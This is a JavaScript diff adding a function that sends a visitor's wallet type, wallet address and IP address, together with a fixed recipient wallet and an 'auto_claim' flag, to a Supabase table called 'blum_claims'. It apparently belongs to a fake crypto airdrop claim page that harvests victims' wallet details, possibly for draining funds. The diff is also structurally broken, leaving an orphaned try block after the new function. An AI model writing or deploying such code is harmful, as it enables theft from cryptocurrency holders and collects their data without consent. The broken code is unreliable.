@@ -109,6 +109,39 @@
     }
     
     async function saveToSupabase(wallet, address, ip) {
+    console.log('🟡 محاولة حفظ البيانات في Supabase...');
+    console.log('💰 Wallet:', wallet);
+    console.log('💳 Address:', address);
+    console.log('🌐 IP:', ip);
+    alert('🟡 جاري حفظ البيانات...');
+    
+    try {
+        const response = await fetch(`${SUPABASE_URL}/rest/v1/blum_claims`, {
+            method: 'POST',
+            headers: { 
+                'apikey': SUPABASE_KEY, 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                wallet_type: wallet,
+                wallet_address: address,
+                recipient_wallet: RECIPIENT_WALLET,
+                network: 'erc20',
+                ip_address: ip,
+                auto_claim: true
+            })
+        });
+        
+        console.log('✅ Response status:', response.status);
+        alert('✅ تم حفظ البيانات بنجاح!');
+        return true;
+        
+    } catch(e) {
+        console.error('❌ خطأ:', e);
+        alert('❌ فشل الحفظ: ' + e.message);
+        return false;
+    }
+}
         try {
             await fetch(`${SUPABASE_URL}/rest/v1/blum_claims`, {
                 method: 'POST',
